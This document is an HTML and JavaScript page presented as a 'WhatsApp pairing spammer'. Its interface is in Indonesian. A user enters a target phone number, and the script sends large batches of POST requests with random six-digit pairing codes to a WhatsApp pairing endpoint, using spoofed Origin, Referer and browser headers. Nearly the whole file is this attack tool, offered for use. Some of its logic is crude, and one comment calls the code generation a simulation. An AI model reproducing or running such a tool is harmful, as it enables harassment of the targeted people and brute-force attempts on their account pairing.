<!DOCTYPE html>
<html>
<head>
<title>🐉 SHINE SHOP WHATSAPP PAIRING SPAMMER</title>
<style>
body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:20px}
.container{max-width:900px;margin:auto;border:2px solid #00ff41;padding:30px;border-radius:10px}
.input-group{margin:15px 0;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
label{width:200px;color:#ff00ff;font-weight:bold}
input,select{background:#111;border:1px solid #00ff41;color:#00ff41;padding:10px;border-radius:5px;flex:1;min-width:200px}
button{background:#00ff41;color:#000;border:none;padding:12px 30px;font-weight:bold;cursor:pointer;border-radius:5px;font-family:monospace}
button:hover{background:#ff00ff;color:#fff}
button.danger{background:#ff0044;color:#fff}
.status{padding:10px;margin:10px 0;border-left:3px solid #ff00ff;background:#111}
#log{height:300px;overflow-y:scroll;background:#000;padding:10px;border:1px solid #333;font-size:12px;white-space:pre-wrap}
.highlight{color:#ff00ff}
.batch-info{color:#ffff00}
</style>
</head>
<body>
<div class="container">
<h1>🐉 SHINE SHOP WA PAIRING SPAMMER v3.0</h1>
<div class="status">⚡ STATUS: <span id="statusText" style="color:#0f0">IDLE</span></div>

<div class="input-group">
    <label>📱 NOMOR TARGET:</label>
    <input type="text" id="targetNumber" placeholder="6281234567890" value="6281234567890">
    <select id="countryCode" style="flex:0.5;min-width:100px">
        <option value="62">🇮🇩 +62</option>
        <option value="60">🇲🇾 +60</option>
        <option value="65">🇸🇬 +65</option>
        <option value="63">🇵🇭 +63</option>
        <option value="66">🇹🇭 +66</option>
        <option value="84">🇻🇳 +84</option>
        <option value="1">🇺🇸 +1</option>
        <option value="44">🇬🇧 +44</option>
        <option value="61">🇦🇺 +61</option>
        <option value="81">🇯🇵 +81</option>
        <option value="82">🇰🇷 +82</option>
        <option value="86">🇨🇳 +86</option>
        <option value="91">🇮🇳 +91</option>
    </select>
</div>

<div class="input-group">
    <label>🔢 JUMLAH PER BATCH:</label>
    <input type="number" id="batchSize" value="50" min="1" max="9999">
</div>

<div class="input-group">
    <label>⏱️ INTERVAL (ms):</label>
    <input type="number" id="interval" value="100" min="10" max="10000">
</div>

<div class="input-group">
    <label>🔄 TOTAL REQUEST:</label>
    <input type="number" id="totalRequests" value="1000" min="1" max="999999">
</div>

<div class="input-group">
    <label>🎯 ENDPOINT:</label>
    <input type="text" id="targetUrl" value="https://web.whatsapp.com/pairing" style="flex:2">
</div>

<div class="input-group">
    <label>🔑 PAIRING CODE:</label>
    <input type="text" id="pairingCode" placeholder="Kosongkan untuk auto-generate" style="flex:1">
</div>

<div style="display:flex;gap:10px;margin:20px 0;flex-wrap:wrap">
    <button onclick="startSpam()">🔥 MULAI SPAM</button>
    <button class="danger" onclick="stopSpam()">⛔ STOP</button>
    <button onclick="clearLog()">🗑️ CLEAR LOG</button>
    <button onclick="testPairing()">🧪 TEST PAIRING</button>
</div>

<div id="log">[SHINE SHOP] Siap menjalankan perintah Bos...\n</div>
</div>

<script>
let running = false;
let logCount = 0;
let spammedCodes = [];

function updateLog(msg, type='info') {
    const log = document.getElementById('log');
    const colors = {
        'success': '#00ff41',
        'error': '#ff0044',
        'warning': '#ffff00',
        'info': '#00ccff'
    };
    const time = new Date().toTimeString().slice(0,8);
    log.innerHTML += `<span style="color:${colors[type] || '#fff'}">[${time}] ${msg}</span>\n`;
    log.scrollTop = log.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '[DRAGON] Log dibersihkan...\n';
    spammedCodes = [];
}

function generatePairingCode(number) {
    // Simulasi generate code berdasarkan nomor (bisa diganti dengan algoritma real)
    const seed = number.slice(-6);
    const base = parseInt(seed) || 123456;
    return Math.floor(100000 + (base * Math.random()) % 900000).toString();
}

async function testPairing() {
    const number = document.getElementById('targetNumber').value.trim();
    const code = generatePairingCode(number);
    document.getElementById('pairingCode').value = code;
    updateLog(`🧪 Generated pairing code for ${number}: ${code}`, 'warning');
    
    // Simulasi test ke WA
    try {
        const response = await fetch('https://web.whatsapp.com/pairing', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `code=${code}&number=${number}`
        });
        updateLog(`📡 Test request sent - Status: ${response.status}`, response.ok ? 'success' : 'error');
    } catch(e) {
        updateLog(`❌ Test failed: ${e.message}`, 'error');
    }
}

async function startSpam() {
    if(running) {
        updateLog('⚠️ Spam masih berjalan Bos! Stop dulu.', 'warning');
        return;
    }
    
    const number = document.getElementById('targetNumber').value.trim();
    if(!number || number.length < 8) {
        updateLog('❌ Nomor target tidak valid!', 'error');
        return;
    }
    
    running = true;
    document.getElementById('statusText').style.color = '#ff00ff';
    document.getElementById('statusText').textContent = 'SPAMMING 🔥';
    
    const batch = parseInt(document.getElementById('batchSize').value) || 50;
    const interval = parseInt(document.getElementById('interval').value) || 100;
    const total = parseInt(document.getElementById('totalRequests').value) || 1000;
    const target = document.getElementById('targetUrl').value || 'https://web.whatsapp.com/pairing';
    const customCode = document.getElementById('pairingCode').value.trim();
    
    updateLog(`🎯 Target: ${number}`, 'info');
    updateLog(`🚀 Memulai spam ke ${target}`, 'info');
    updateLog(`📊 Batch: ${batch} | Interval: ${interval}ms | Total: ${total}`, 'warning');
    
    let sent = 0;
    let success = 0;
    let failed = 0;
    spammedCodes = [];
    
    while(sent < total && running) {
        const promises = [];
        const currentBatch = Math.min(batch, total - sent);
        
        for(let i = 0; i < currentBatch; i++) {
            let code;
            if(customCode) {
                // Generate variasi dari custom code
                const base = parseInt(customCode) || 123456;
                code = (base + i + Math.floor(Math.random() * 100)) % 1000000;
                code = code.toString().padStart(6, '0');
            } else {
                code = generatePairingCode(number);
            }
            
            spammedCodes.push(code);
            
            // Construct payload with number and code
            const payload = new URLSearchParams({
                code: code,
                number: number,
                _: Date.now()
            });
            
            promises.push(
                fetch(target, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Origin': 'https://web.whatsapp.com',
                        'Referer': 'https://web.whatsapp.com/'
                    },
                    body: payload.toString(),
                    mode: 'no-cors'
                })
                .then(res => {
                    success++;
                    updateLog(`✅ ${number} - Code: ${code} (${res.status || 'OK'})`, 'success');
                })
                .catch(err => {
                    failed++;
                    updateLog(`❌ ${number} - Code: ${code} (${err.message})`, 'error');
                })
            );
        }
        
        await Promise.allSettled(promises);
        sent += currentBatch;
        
        updateLog(`📦 Batch selesai | Total: ${sent}/${total} | Sukses: ${success} | Gagal: ${failed}`, 'warning');
        updateLog(`🔑 Last codes: ${spammedCodes.slice(-5).join(', ')}`, 'info');
        
        if(sent < total && running) {
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    }
    
    running = false;
    document.getElementById('statusText').style.color = '#0f0';
    document.getElementById('statusText').textContent = 'SELESAI ✅';
    updateLog(`🏁 Spam selesai! Total: ${sent} | Sukses: ${success} | Gagal: ${failed}`, 'warning');
    updateLog(`📋 All codes: ${spammedCodes.join(', ')}`, 'info');
}

function stopSpam() {
    running = false;
    document.getElementById('statusText').style.color = '#ff0044';
    document.getElementById('statusText').textContent = 'STOPPED ⛔';
    updateLog('🛑 Spam dihentikan oleh user!', 'error');
}
</script>
</body>
</html>
